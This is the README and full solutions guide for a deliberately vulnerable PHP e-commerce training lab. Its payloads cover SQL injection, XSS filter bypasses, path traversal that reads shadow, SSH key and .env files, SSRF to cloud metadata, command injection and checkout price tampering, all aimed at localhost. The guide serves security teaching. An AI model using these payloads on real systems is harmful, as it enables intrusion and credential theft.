# 🎯 CyberHunt - Security Training Lab

> A deliberately vulnerable e-commerce web application designed for security training and penetration testing practice.

![PHP](https://img.shields.io/badge/PHP-8.x-777BB4?logo=php)
![Bootstrap](https://img.shields.io/badge/Bootstrap-5.3-7952B3?logo=bootstrap)
![SQLite](https://img.shields.io/badge/SQLite-3-003B57?logo=sqlite)
![License](https://img.shields.io/badge/License-Educational-green)

---

## ⚠️ WARNING

**This application is INTENTIONALLY VULNERABLE!**

- Do NOT deploy in production
- Do NOT use on public networks
- For educational purposes ONLY
- Use in isolated/sandboxed environments

---

## 🚀 Quick Start

```bash
# Clone and navigate to directory
cd CyberHunt

# Start the application
./start.sh

# Or manually:
php -S localhost:8080 router.php
```

**Access:** http://localhost:8080

---

## 🔐 Test Credentials

| Username | Password | Role |
|----------|----------|------|
| `admin` | `admin123` | Admin |
| `testuser` | `password123` | User |

**SQL Injection Login Bypass:**
```
Username: admin' --
Password: anything
```

---

## 🎟️ Coupon Codes

| Code | Discount | Notes |
|------|----------|-------|
| `WELCOME10` | 10% off | Popup after login |
| `GRAND20` | 20% off | Shown in banner |
| `FLAT50` | $50 off | Hidden |

**Vulnerability:** Alternate between coupons to stack unlimited discounts!

---

## 🔥 Vulnerabilities Included

### OWASP Top 10 Coverage

| # | Vulnerability | Location |
|---|---------------|----------|
| 1 | **SQL Injection** | Login, Search, Products |
| 2 | **XSS (Reflected)** | Search (filter bypass) |
| 3 | **XSS (Stored)** | Reviews, Messages, Profile |
| 4 | **Path Traversal** | API, Export |
| 5 | **SSRF** | API fetch endpoint |
| 6 | **IDOR** | User data, Orders |
| 7 | **Command Injection** | Contact form |
| 8 | **Broken Auth** | Weak hashing, Secret Q&A |
| 9 | **Sensitive Data Exposure** | API, Comments |
| 10 | **Business Logic** | Coupon stacking |

### Quick Test Commands

```bash
# Path Traversal
curl "http://localhost:8080/api.php?action=file&name=../../../etc/passwd"

# SSRF
curl "http://localhost:8080/api.php?action=fetch&url=file:///etc/passwd"

# User Enumeration
curl "http://localhost:8080/api.php?action=users&limit=10"

# XSS (filter bypass)
http://localhost:8080/search.php?q=<img src=x onerror=alert(1)>
```

---

## 📁 Directory Structure

```
CyberHunt/
├── admin/              # Admin panel
├── api.php             # Vulnerable API endpoint
├── assets/             # CSS, JS, images
├── config/             # Database configuration
├── database/           # SQLite database
├── exports/            # User data exports
├── fake_root/          # Simulated filesystem for path traversal
│   ├── etc/            # passwd, shadow, hosts
│   ├── home/           # admin notes, SSH keys, .env
│   └── var/log/        # auth.log, app.log
├── includes/           # Header & footer
├── router.php          # Request router with 404 handling
├── start.sh            # Startup script
└── *.php               # Application pages
```

---

## 🔍 Discovery Points

### Hidden in Source Code (View Page Source)
- API endpoints listed in HTML comments on homepage
- Developer notes with sensitive info

### robots.txt & sitemap.xml
- Exposed admin paths
- Backup file locations

### Error Messages
- SQL errors reveal query structure
- Stack traces expose file paths

---

## 📚 Documentation

- **[VULNERABILITIES.md](VULNERABILITIES.md)** - Detailed vulnerability documentation with payloads

---

## 🛠️ Technology Stack

- **Backend:** PHP 8.x (no framework)
- **Frontend:** Bootstrap 5, Custom CSS
- **Database:** SQLite 3
- **Icons:** Bootstrap Icons
- **Fonts:** Inter (Google Fonts)

---

## 📝 Features

- User Registration & Login
- Product Catalog (50+ products)
- Shopping Cart & Checkout
- User Profiles with Photo Upload
- Order History
- Product Reviews
- Admin Panel
- Contact Form
- Search Functionality
- Coupon System
- Messaging System
- Data Export

---

## 🎓 Learning Objectives

After practicing with CyberHunt, you will understand:

1. How SQL Injection works and how to exploit it
2. Different types of XSS and filter bypass techniques
3. Path traversal to read sensitive files
4. SSRF attacks and internal network access
5. IDOR vulnerabilities in APIs
6. Business logic flaws in e-commerce
7. Information disclosure through source code
8. Importance of proper authentication

---

## ⚖️ License

**For educational purposes only.**

This project is designed for:
- Security training courses
- CTF practice
- Penetration testing learning
- Web security awareness

Do NOT use for malicious purposes.

---

# 🎯 CyberHunt - Complete Solutions Guide

> **SPOILER ALERT!** This document contains full solutions for all vulnerabilities. Try to find them yourself first!

---

## 📋 Table of Contents

1. [SQL Injection](#1-sql-injection)
2. [Cross-Site Scripting (XSS)](#2-cross-site-scripting-xss)
3. [Path Traversal / Directory Traversal](#3-path-traversal--directory-traversal)
4. [Server-Side Request Forgery (SSRF)](#4-server-side-request-forgery-ssrf)
5. [Insecure Direct Object Reference (IDOR)](#5-insecure-direct-object-reference-idor)
6. [Command Injection](#6-command-injection)
7. [Broken Authentication](#7-broken-authentication)
8. [Sensitive Data Exposure](#8-sensitive-data-exposure)
9. [Business Logic Flaws](#9-business-logic-flaws)
10. [Information Disclosure](#10-information-disclosure)

---

## 1. SQL Injection

### 1.1 Login Bypass
**Location:** `/login.php`

**Solution:**
```
Username: admin' --
Password: anything
```

**Alternative Payloads:**
```
admin' OR '1'='1' --
' OR 1=1 --
admin'/*
```

**What Happens:** The `--` comments out the password check, logging you in as admin.

---

### 1.2 Search SQL Injection
**Location:** `/search.php?q=`

**Solution:**
```
http://localhost:8080/search.php?q=' OR 1=1 --
```

**Data Extraction:**
```
http://localhost:8080/search.php?q=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13 --
```

---

### 1.3 Product SQL Injection
**Location:** `/product.php?id=`

**Solution:**
```
http://localhost:8080/product.php?id=1 OR 1=1
```

---

## 2. Cross-Site Scripting (XSS)

### 2.1 Reflected XSS (with Filter Bypass)
**Location:** `/search.php?q=`

**Blocked Payload:**
```html
<script>alert(1)</script>  → [FILTERED]
```

**Bypass Payloads (Working):**
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
```

**Solution URL:**
```
http://localhost:8080/search.php?q=<img src=x onerror=alert('XSS')>
```

---

### 2.2 Stored XSS - Reviews
**Location:** `/product.php` (Review Form)

**Solution:** Submit a product review with:
```html
<img src=x onerror=alert('Stored XSS')>
```

---

### 2.3 Stored XSS - Profile Bio
**Location:** `/edit-profile.php`

**Solution:** Set your bio to:
```html
<svg onload=alert(document.cookie)>
```

---

## 3. Path Traversal / Directory Traversal

### 3.1 API File Read
**Location:** `/api.php?action=file&name=`

**Solution - Using ../ sequences:**
```bash
curl "http://localhost:8080/api.php?action=file&name=../../../etc/passwd"
curl "http://localhost:8080/api.php?action=file&name=../../../etc/shadow"
curl "http://localhost:8080/api.php?action=file&name=../../../home/admin/notes.txt"
curl "http://localhost:8080/api.php?action=file&name=../../../home/admin/.ssh/id_rsa"
curl "http://localhost:8080/api.php?action=file&name=../../../home/www-data/.env"
```

**Solution - Using absolute paths:**
```bash
curl "http://localhost:8080/api.php?action=file&name=/etc/passwd"
curl "http://localhost:8080/api.php?action=file&name=/home/admin/notes.txt"
```

### 3.2 Sensitive Files Found

| File | Credentials Found |
|------|-------------------|
| `/etc/passwd` | System users |
| `/etc/shadow` | Password hashes |
| `/home/admin/notes.txt` | SSH, DB, AWS, Stripe passwords |
| `/home/www-data/.env` | AWS keys, Stripe keys, DB password |
| `/home/admin/.ssh/id_rsa` | SSH private key |
| `/var/log/auth.log` | Failed login attempts |

---

## 4. Server-Side Request Forgery (SSRF)

### 4.1 Local File Read via SSRF
**Location:** `/api.php?action=fetch&url=`

**Solution:**
```bash
curl "http://localhost:8080/api.php?action=fetch&url=file:///etc/passwd"
```

### 4.2 Internal Service Access
```bash
# AWS Metadata (if on EC2)
curl "http://localhost:8080/api.php?action=fetch&url=http://169.254.169.254/latest/meta-data/"

# Internal services
curl "http://localhost:8080/api.php?action=fetch&url=http://127.0.0.1:3306"
```

---

## 5. Insecure Direct Object Reference (IDOR)

### 5.1 Access Any User's Data
**Location:** `/api.php?action=export&user_id=`

**Solution:**
```bash
# Get admin user data (ID=1)
curl "http://localhost:8080/api.php?action=export&user_id=1&format=json"

# Get any user's data
curl "http://localhost:8080/api.php?action=export&user_id=2&format=json"
```

### 5.2 List All Users (No Auth)
**Location:** `/api.php?action=users`

**Solution:**
```bash
curl "http://localhost:8080/api.php?action=users&limit=100"
```

**Data Exposed:** Usernames, emails, password hashes (MD5), secret questions/answers

---

## 6. Command Injection

### 6.1 Contact Form
**Location:** `/contact.php`

**Solution:** In the "Name" field, enter:
```
'; cat /etc/passwd #
```

**Alternative Payloads:**
```
'; whoami > /tmp/pwned.txt #
$(id)
`id`
```

---

## 7. Broken Authentication

### 7.1 Password Reset Bypass
**Location:** `/forgot-password.php`

**Admin's Secret Question:** "What is your favorite security tool?"
**Answer:** `burpsuite`

### 7.2 Weak Password Hashing
Passwords use unsalted MD5. Crack with rainbow tables:
```
admin hash: d54d1702ad0f8326224b817c796763c9 = admin123
```

---

## 8. Sensitive Data Exposure

### 8.1 API Exposes All User Data
```bash
curl "http://localhost:8080/api.php?action=users&limit=100"
```

Returns:
- Usernames
- Email addresses  
- MD5 password hashes
- Secret questions/answers
- Personal information

### 8.2 Database Accessible
```
http://localhost:8080/database/cyberhunt.db
```

### 8.3 Source Code Comments
View page source on homepage to find hidden API endpoints.

---

## 9. Business Logic Flaws

### 9.1 Coupon Code Stacking
**Location:** `/cart.php`, `/apply-coupon.php`

**Available Coupons:**
- `WELCOME10` - 10% off
- `GRAND20` - 20% off  
- `FLAT50` - $50 off

**Exploit Steps:**
1. Add items to cart ($100 total)
2. Apply `WELCOME10` → Discount: $10
3. Apply `GRAND20` → Discount: $10 + $20 = $30
4. Apply `WELCOME10` again → Discount: $30 + $10 = $40
5. Keep alternating → Get items for FREE!

**Root Cause:** When a different coupon is applied, it ADDS to existing discount instead of replacing it.

### 9.2 Price Manipulation
**Location:** `/checkout.php`

Hidden field in form:
```html
<input type="hidden" name="total_amount" value="269.99">
```

**Solution:** Use browser dev tools or Burp to change value to `0.01`

### 9.3 Negative Quantity
**Location:** `/cart.php`

**Solution:** Set quantity to `-10` to get store credit.

---

## 10. Information Disclosure

### 10.1 Hidden API Endpoints in Source
**Location:** View source of homepage

**Found in HTML comments:**
```html
<!--
    API Endpoints:
    - /api/v2/graphql.php
    - /api/internal/config.json
    - /backup/db_dump.zip
    - /api.php              ← THE WORKING ONE!
    - /logs/access.txt
    ...
-->
```

### 10.2 robots.txt
**Location:** `/robots.txt`

Reveals admin paths and backup locations.

### 10.3 Error Messages
SQL errors reveal query structure:
```
SQLSTATE[HY000]: General error: 1 near "XSS": syntax error
```

---

## 🔧 Quick Exploitation Commands

```bash
# SQL Injection - Login Bypass
# Username: admin' --

# Path Traversal
curl "http://localhost:8080/api.php?action=file&name=../../../etc/passwd"
curl "http://localhost:8080/api.php?action=file&name=../../../home/admin/notes.txt"

# SSRF
curl "http://localhost:8080/api.php?action=fetch&url=file:///etc/passwd"

# User Enumeration (IDOR)
curl "http://localhost:8080/api.php?action=users&limit=100"

# XSS (Filter Bypass)
http://localhost:8080/search.php?q=<img src=x onerror=alert(1)>
```

---

## � Vulnerability Summary

| Vulnerability | Difficulty | Impact |
|---------------|------------|--------|
| SQL Injection (Login) | Easy | Critical |
| XSS (Filter Bypass) | Medium | High |
| Path Traversal | Easy | Critical |
| SSRF | Easy | Critical |
| IDOR | Easy | High |
| Command Injection | Medium | Critical |
| Coupon Stacking | Medium | High |
| Information Disclosure | Easy | Medium |

---

## 🎓 Learning Points

1. **Never trust user input** - Always sanitize and validate
2. **Use parameterized queries** - Prevents SQL injection
3. **Encode output** - Prevents XSS
4. **Validate file paths** - Prevents path traversal
5. **Whitelist URLs** - Prevents SSRF
6. **Check authorization** - Prevents IDOR
7. **Never use shell_exec with user input** - Prevents command injection
8. **Use strong password hashing** - bcrypt, not MD5
9. **Hide sensitive information** - Remove comments before production
10. **Validate business logic** - Check coupon usage properly

---

## ⚠️ Disclaimer

This is for **educational purposes only**. Do NOT use these techniques on systems without authorization.

Happy Learning! 🎯
